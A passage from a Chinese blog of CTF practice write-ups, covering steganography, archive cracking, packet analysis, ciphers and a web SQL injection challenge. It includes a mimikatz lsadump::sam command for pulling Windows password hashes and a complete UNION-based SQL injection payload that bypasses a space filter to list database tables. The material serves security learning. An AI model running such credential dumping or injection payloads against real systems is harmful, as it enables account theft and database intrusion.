<li><p>下载软件<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1683140">mimikatz</a>,关于本软件，还可以了解<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310">这里</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310">这里</a></p>
</li>
<li><p>打开,cd进入config目录</p>
</li>
<li><p>输入命令<code> lsadump::sam /sam:SAM /system:SYSTEM</code>,关于本命令，参考上面链接</p>
</li>
<li><p>可以看到</p>
</li>
<li><p>盲猜此处为用户名和密码，可以看到密码处为<code>hash nltm</code>要进行<a target="_blank" rel="noopener" href="https://www.cmd5.com/">解密</a><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_Misc_simpleQuzheng" alt="Pasted image 20221124165443.png"></p>
</li>
<li><p>发现解密失败，向下继续寻找，看到<img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_Misc_simpleQuzheng2.webp" alt="Pasted image 20221124171753.png"></p>
</li>
<li><p>进行解密，获得密码</p>
</li>
<li><p>按照题目要求格式输出flag</p>
</li>
</ul>
</li>
</ul>
</li>
<li>考察知识点<ul>
<li>windos系统密码的获取</li>
<li><a target="_blank" rel="noopener" href="https://cn.bing.com/search?q=procdump+mimikatz&qs=SS&pq=procdump&sk=SS3&sc=10-8&cvid=7A0A7F444B8C4E32B64204849648389D&FORM=QBRE&sp=4">procdump</a></li>
</ul>
</li>
</ul>
<h4 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h4><ul>
<li>打开文件，是一张png图片，丢进stegsolve看看</li>
<li>顺带一提<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43639682/article/details/113857310">stegsolve的用法</a></li>
<li>发现图片上方有一行显示不全的小字</li>
<li>看wp发现是图片高度问题，怎么更改？<ul>
<li><p>把图片放入winhex或者010editor查看图片的二进制文件</p>
</li>
<li><p>图片第一行为图片信息，第二行前八个字节为图片的宽高</p>
</li>
<li><p><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_Misc_hiddenWrite" alt="Pasted image 20221124212122.png"></p>
</li>
<li><p>将原来的A4改为第三行的F4，往大改</p>
</li>
<li><p>看到flag</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/picture/png/">为什么第二行前八个字节为图片宽高？</a></p>
</li>
</ul>
</li>
</ul>
<h4 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h4><ul>
<li>打开题目还是一张图片</li>
<li>我们用010editor打开，发现rar等文件</li>
<li>复制图片到kali，使用binwalk分离<ul>
<li>发现flag.rar压缩包和密码提示，提示为扑克牌相关的三个数字，并无思路</li>
</ul>
</li>
<li>复制压缩包到本地，发现打开需要密码</li>
<li>既然有密码提示，说明不是伪加密，但是如果是伪加密，我们怎么做？<ul>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1808156#:~:text=%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%20%E5%A6%82%E9%81%87%E5%8A%A0%E5%AF%86%E5%8E%8B%E7%BC%A9%E5%8C%85%EF%BC%8C%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%AF%86%E7%A0%81%E6%8F%90%E7%A4%BA%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%85%88%E5%88%A4%E6%96%AD%E6%98%AF%E4%B8%8D%E6%98%AF%E4%BC%AA%E5%8A%A0%E5%AF%86%20%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E7%9C%8B%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%AC%AC%E4%B8%80%E8%A1%8C%E5%A6%82%E6%9E%9C%E6%9C%89%2009%20%E5%A4%9A%E5%8D%8A%E5%B0%B1%E6%98%AF%E4%BA%86%20%E7%82%B9%E5%87%BB%E6%9F%A5%E6%89%BE%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%E5%80%BC%E6%90%9C%E7%B4%A2,504B%20%EF%BC%8C%E6%9C%80%E5%90%8E%E5%A6%82%E6%9E%9C%E6%9C%89%2009%20%E9%82%A3%E5%9F%BA%E6%9C%AC%E5%B0%B1%E6%98%AF%E4%BA%86%EF%BC%8C%E6%94%B9%E4%B8%BA%2000%20%E5%AE%8C%E6%B4%BB">关于伪加密的判断及处理</a></li>
<li>参考ctfwiki</li>
</ul>
</li>
<li>至此，我们的思路是使用AZPR对压缩包进行爆破<ul>
<li>但是压缩包的格式是rar，azpr用于处理zip加密</li>
<li>看wp，kali中使用<code>file flag.rar</code>发现，该压缩包实际上是zip形式</li>
<li>我们修改格式后放入azpr</li>
<li>爆破出密码871</li>
</ul>
</li>
<li>获得密码，得到图片，扔入010editor，根据题目提示搜索<code>f1@g</code>得到一串base64加密字符串</li>
<li>解密获得flag</li>
</ul>
<h4 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h4><ul>
<li>照常扔进010editor观察，发现十分复杂</li>
<li>复制到kali，binwalk查看，<ul>
<li>发现三四张图片</li>
<li>binwalk -e分离</li>
<li>分离失败</li>
<li>使用foremost进行分离，命令如下：<ul>
<li><code>foremost -o filename 指定分离出来文件的文件夹，不能有内容，不存在则新建</code></li>
</ul>
</li>
<li>分离完毕，发现flag</li>
</ul>
</li>
</ul>
<h4 id="talnet"><a href="#talnet" class="headerlink" title="talnet"></a>talnet</h4><ul>
<li>下载附件发现是pcpng包，立马想到用wireshark</li>
<li>用wireshark打开流量包</li>
<li>根据题目提示选择一个talnet包，右键追踪流-&gt;追踪TCP流</li>
<li>得到flag</li>
</ul>
<h4 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h4><ul>
<li>下载后直接打开docx文件，发现就只有两个符号，猜测编码异常</li>
<li>使用010editor打开文件未发现异常（其实这里就能看出来压缩包的文件头）</li>
<li>换做记事本打开，发现几串类似文件名的字符串，猜测为压缩包，更改后缀为.zip解压后对其中文件搜索，找到flag</li>
</ul>
<hr>
<ul>
<li>补充知识点<ul>
<li>任意office文件（网上这么说，我只试验了docx）都是压缩包，更改后缀即可解压</li>
<li>压缩包文件头，参考CTF wiki</li>
<li>搜索flag可以使用vscode打开该文件夹进行全局搜索，而不是逐个搜索</li>
</ul>
</li>
</ul>
<h4 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h4><ul>
<li>解压后发现是一个图片文件，优先丢到010editor里面去看<ul>
<li>留意到两片空白中间有一串字符，类似十六进制数字</li>
<li>留意到最后有一个flag.txt，确认是个压缩包，直接修改后缀</li>
<li>打开发现需要密码<ul>
<li>联想到刚刚发现的上图字符</li>
<li>十六进制转数字，密码输入错误</li>
<li>转字符串，解压成功，拿到flag</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><ul>
<li>下载附件发现是一个pcpng包，打开wireshark，是ICMP流，不能追踪</li>
<li>打开第一个包，data里获得f，第二个包data获得l….拼出来就是flag<img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_Misc_ping.webp" alt="Pasted image 20221125120440.png"></li>
</ul>
<h4 id="赛博朋克"><a href="#赛博朋克" class="headerlink" title="赛博朋克"></a>赛博朋克</h4><ul>
<li>初步思路<ul>
<li>打开发现是个txt乱码，直接扔到010editor看一看</li>
<li>发现png文件头，修改格式为.png</li>
<li>扔到stegsolve看一看<ul>
<li>向右的过程中发现图片左上角出现一条细线，盲猜高度隐写</li>
<li>010editor编辑高度，发现得不到结果</li>
<li>开始犯病，用修改了高度的图片进行lsb隐写获取…</li>
<li>发现得不到flag（用原图这一步就出来了）</li>
</ul>
</li>
</ul>
</li>
<li>看wp，发现用zsteg一步得到结果<ul>
<li>打开虚拟机（centos7）安装zsteg<ul>
<li>需要gem</li>
<li>需要zpng</li>
<li>…</li>
<li>最后需要ruby2.5版本，本机ruby版本2.0</li>
<li>如何升级？<ul>
<li>网上找办法没找到，gbg密钥始终获取不到，怀疑是网络问题<ul>
<li>又开始查找[[0071 虚拟机访问本地VPN|虚拟机连接本地代理]]</li>
<li>发现连接好也不能解决问题，微笑</li>
<li>看到这篇<a target="_blank" rel="noopener" href="https://blog.51cto.com/34144451/3773031">文章</a>，成功升级，把所有ruby24记得改为25，否则到安装zsteg还得安装一遍25（不要问我怎么知道的）</li>
</ul>
</li>
</ul>
</li>
<li>安装好了ruby25，对上面的zpng等包进行安装</li>
<li>安装成功zsteg</li>
<li>ftp传输附件到linux，运行<code>zsteg cyberpunk.png</code></li>
<li>看到flag</li>
</ul>
</li>
</ul>
</li>
<li>附：看wp之前这题的压缩包还有伪加密，现在没有了<ul>
<li>关于伪加密的处理，参考CTF wiki，对相应处二进制文件使用010editor进行修改即可</li>
</ul>
</li>
</ul>
<h4 id="贝斯手"><a href="#贝斯手" class="headerlink" title="贝斯手"></a>贝斯手</h4><ul>
<li>下载附件<ul>
<li>__MACOSX</li>
<li>flag.zip</li>
<li>介绍.txt</li>
<li>女神剧照.jpg</li>
</ul>
</li>
<li>可以看到内容中有一个__MACOSX文件夹，这是干嘛的？<ul>
<li>苹果在压缩文件的同时，还往里面写入了一些”MetaData”，这样做的目的是为了方便其它的Mac用户使用(就像Windows会在图片目录下加入的Thumbs.db以方便显示预览图一样 )。这些MetaData产生的文件就是”__MACOSX”，本身这些文件在Mac系统上是隐藏属性的，也的确方便了用户的操作。但是插件、模板等作品是要让很多人使用的，这里面大部分人都是Windows操作系统，而Windows又是从不鸟苹果的，__MACOSX就成了垃圾文件。</li>
</ul>
</li>
<li>尝试打开flag压缩包，发现加密，查看介绍，是缝纫机乐队的介绍，也介绍了出题人的女神</li>
<li>查看图片</li>
<li>没思路</li>
<li>看wp，才注意到txt文件可以向下翻</li>
<li>提示出生年份为压缩包密码</li>
<li>输入获得flag.txt<ul>
<li>打开文件，内容为：<code>5+58==327a6c4304ad5938eafoefb6cc3e53dcCFmZknmK3SDEcMEue1wrsJdqqkt7dXLuS</code></li>
<li>还是没思路，嗨嗨嗨</li>
<li>看wp发现，5+58意为MD5+Base58加密<ul>
<li>[[0072 CTF优质博客#^3a8950|复习各种编码文件的特征]]</li>
<li>对记事本中的字符串进行相应长度的截取，并进行以上格式的解密，获得flag</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="blind-injection"><a href="#blind-injection" class="headerlink" title="blind_injection"></a>blind_injection</h4><ul>
<li><p>题目意为盲注</p>
</li>
<li><p>下载附件打开是一个pcpng流量包，用wireshark打开</p>
</li>
<li><p>看wp得知SQL注入一般都使用http协议</p>
</li>
<li><p>导出http流查看[wireshark-&gt;工具栏-&gt;文件-&gt;导出对象-&gt;HTTP]</p>
</li>
<li><p>盲注注入成功后就不再执行，因此，每一个包最后一个就是注入成功的案例</p>
</li>
<li><p><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_Misc_blindInjection" alt="Pasted image 20221125173130.png"></p>
</li>
<li><p>向下寻找，看到分开的flag</p>
</li>
</ul>
<h4 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h4><ul>
<li>如题，下载工具routerpassview</li>
<li>拖入附件，按题目提示搜索username</li>
<li>获得flag，没什么好说的</li>
</ul>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="x2F"><a href="#x2F" class="headerlink" title="&#x2F;.-"></a>&#x2F;.-</h4><ul>
<li>看题目简介<ul>
<li>..-.&#x2F;.-..&#x2F;.-&#x2F;–.&#x2F;—-.–&#x2F;-..&#x2F;…–&#x2F;..-.&#x2F;-.-.&#x2F;-…&#x2F;..-.&#x2F;.—-&#x2F;–…&#x2F;..-.&#x2F;—-.&#x2F;…–&#x2F;—-.&#x2F;—-.&#x2F;…..&#x2F;—–&#x2F;….-&#x2F;—–.-</li>
</ul>
</li>
<li>联想到摩斯密码，使用[[0070 CTF 在线工具#^f33e46|工具]]转换<ul>
<li>获得 FLAG%u7bD3FCBF17F9399504%u7d<ul>
<li>对于flag，补充知识点<ul>
<li>摩斯密码不区分大小写，对于英文字母一律转大写</li>
<li>%u7b和%u7d是Ascll转换Hex编码。转换结果分别为{ }</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><ul>
<li>题目描述： 一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</li>
<li>联想到栅栏密码<ul>
<li>复制后面字符串至[[0070 CTF 在线工具#^2925e8|栅栏密码]]解密，每组字数为2</li>
<li>获得flag</li>
</ul>
</li>
</ul>
<h4 id="ok-x2F-lt-gt"><a href="#ok-x2F-lt-gt" class="headerlink" title="ok&#x2F; [+-&lt;&gt;]"></a>ok&#x2F; [+-&lt;&gt;]</h4><ul>
<li>采用Ook&#x2F;brainfuck极简编程语言，考察知识面，点击<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">这里</a>解码</li>
<li>获得flag</li>
</ul>
<h2 id="CTF-Show"><a href="#CTF-Show" class="headerlink" title="CTF Show"></a>CTF Show</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><ul>
<li>sql注入。尝试万能密码绕过提示<code>SQL injection error</code>，考虑过滤了一些符号</li>
<li>逐个字符尝试发现过滤空格，绕过空格过滤的替代方法<ul>
<li><code>/**/</code></li>
<li>()</li>
<li>回车(url编码中的%0a)  </li>
<li>`(tab键上面的按钮)  </li>
<li>tab  两个空格</li>
</ul>
</li>
<li>登录成功<ul>
<li>常规爆表暴库爆字段</li>
<li>得到flag</li>
</ul>
</li>
<li>问题<ul>
<li>MySQL中的反引号和单引号的区别<ul>
<li>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号<ul>
<li>有MYSQL保留字作为字段的，必须加上反引号来区分</li>
<li>所谓的保留字就是select database insert 这一类数据库的sql指令，当我们不得已要拿他们来做表名和字段名的时候 我们必须要加反引号来避免编译器把这部分认为是保留字而产生错误。</li>
</ul>
</li>
<li>SQL 使用单引号来环绕文本值。如果是数值，请不要使用引号</li>
</ul>
</li>
<li><code>username=admin&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1</code><ul>
<li>爆表payload</li>
</ul>
</li>
</ul>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io">zha0fe1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io/2022/10/26/0051%20CTF%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%20WP/">https://musewithwind.gitee.io/2022/10/26/0051%20CTF%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%20WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://musewithwind.gitee.io" target="_blank">暮色随风</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/29/Git%E6%B3%84%E9%9C%B2%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86-%E8%BD%AC%E8%BD%BD/"><img class="prev-cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//git.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Git泄露相关知识-转载</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/18/%E5%8A%A8%E6%9C%BA%E6%80%A7%E6%8E%A8%E7%90%86/"><img class="next-cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/book.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">动机性推理</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/29/CTF%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" title="CTF在线工具"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//ctf.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">CTF在线工具</div></div></a></div><div><a href="/2022/11/29/CTF%E4%BC%98%E8%B4%A8%E5%8D%9A%E5%AE%A2/" title="CTF优质博客"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//ctf.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">CTF优质博客</div></div></a></div><div><a href="/2022/11/29/Git%E6%B3%84%E9%9C%B2%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86-%E8%BD%AC%E8%BD%BD/" title="Git泄露相关知识-转载"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//git.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">Git泄露相关知识-转载</div></div></a></div><div><a href="/2022/12/02/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/SQL_Injection.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-02</div><div class="title">SQL注入</div></div></a></div><div><a href="/2023/04/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/" title="小迪安全"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-05</div><div class="title">小迪安全</div></div></a></div><div><a href="/2023/04/20/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AB%A0%E8%8A%82%E5%A4%8D%E7%9B%98/" title="小迪安全章节复盘"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-20</div><div class="title">小迪安全章节复盘</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zha0fe1</div><div class="author-info__description">江湖夜雨十年灯</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://m.weibo.cn/u/7713352758?uid=7713352758&amp;t=0&amp;luicode=10000011&amp;lfid=100103type%3D1%26q%3D%E5%AF%B9%E6%8A%97%E6%97%A0%E6%84%8F%E4%B9%89"><i class="fab fa-github"></i><span>More</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:1379887009@qq.com" target="_blank" title="Email"><i class="QQ"></i></a><a class="social-icon" href="https://github.com/suifen" target="_blank" title="Github"><i class="github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">回首向来萧瑟处,归去,也无风雨也无晴</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUU"><span class="toc-number">1.</span> <span class="toc-text">BUU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic"><span class="toc-number">1.1.</span> <span class="toc-text">Basic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Labs"><span class="toc-number">1.1.1.</span> <span class="toc-text">Linux Labs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-LFI-COURSE-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">BUU LFI COURSE 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-BRUTE-1"><span class="toc-number">1.1.3.</span> <span class="toc-text">BUU BRUTE 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-Labs-Linux"><span class="toc-number">1.1.4.</span> <span class="toc-text">Upload-Labs-Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-CODE-REVIEW-1"><span class="toc-number">1.1.5.</span> <span class="toc-text">BUU CODE REVIEW 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-UPLOAD-COURSE-1"><span class="toc-number">1.1.6.</span> <span class="toc-text">BUU UPLOAD COURSE 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli-labs"><span class="toc-number">1.1.7.</span> <span class="toc-text">sqli-labs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-BURP-COURSE-1"><span class="toc-number">1.1.8.</span> <span class="toc-text">BUU BURP COURSE 1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">强网杯 随便注 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUU-SQL-COURSE-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">BUU SQL COURSE 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pingpingping"><span class="toc-number">1.2.3.</span> <span class="toc-text">pingpingping</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bugku"><span class="toc-number">2.</span> <span class="toc-text">Bugku</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-1"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-SSTI-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">Simple_SSTI_1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-SSTI-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">Simple_SSTI_2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-number">2.1.3.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask-FileUpload"><span class="toc-number">2.1.4.</span> <span class="toc-text">Flask_FileUpload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">2.1.5.</span> <span class="toc-text">留言板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.6.</span> <span class="toc-text">社工-初步收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#game1"><span class="toc-number">2.1.7.</span> <span class="toc-text">game1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#snowfall"><span class="toc-number">2.1.8.</span> <span class="toc-text">snowfall</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">2.1.9.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.1.10.</span> <span class="toc-text">本地管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bp"><span class="toc-number">2.1.11.</span> <span class="toc-text">bp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-number">2.1.12.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F1"><span class="toc-number">2.1.13.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sorce"><span class="toc-number">2.1.14.</span> <span class="toc-text">sorce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="toc-number">2.1.15.</span> <span class="toc-text">备份是个好习惯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.16.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">2.1.17.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#never-give-up"><span class="toc-number">2.1.18.</span> <span class="toc-text">never_give_up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="toc-number">2.1.19.</span> <span class="toc-text">文件包含2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell"><span class="toc-number">2.1.20.</span> <span class="toc-text">getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E8%AF%A5%E9%A9%AC-%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F-%E8%AE%BF%E9%97%AE%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%A4%B1%E8%B4%A5%EF%BC%8C%E8%BF%99%E6%98%AF%E6%80%8E%E4%B9%88%E5%9B%9E%E4%BA%8B%EF%BC%9F-%E7%9C%8Bwp%EF%BC%8C%E5%BE%97%E7%9F%A5%E5%9C%A8%E6%AD%A4%E5%A4%84%E8%AE%BE%E7%BD%AE%E4%BA%86disablefunction%E5%87%BD%E6%95%B0%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E9%82%A3%E4%B9%88%E6%88%91%E4%BB%AC%E6%80%8E%E4%B9%88%E8%AE%BF%E9%97%AEphpinfo%E5%92%8C%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87disablefunction%E5%87%BD%E6%95%B0%EF%BC%9F-%E6%89%93%E5%BC%80%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%EF%BC%8C%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA-%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6phpinfo%E5%92%8C%E7%BB%95%E8%BF%87disablefunction-%E6%89%93%E5%BC%80%E8%BF%9E%E6%8E%A5%E5%88%97%E8%A1%A8%EF%BC%8C%E5%8F%B3%E9%94%AE%E9%A2%98%E7%9B%AE%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6%EF%BC%8C%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E5%8A%A0%E8%BD%BDPHPinfo%E6%8F%92%E4%BB%B6-%E6%89%93%E5%BC%80%E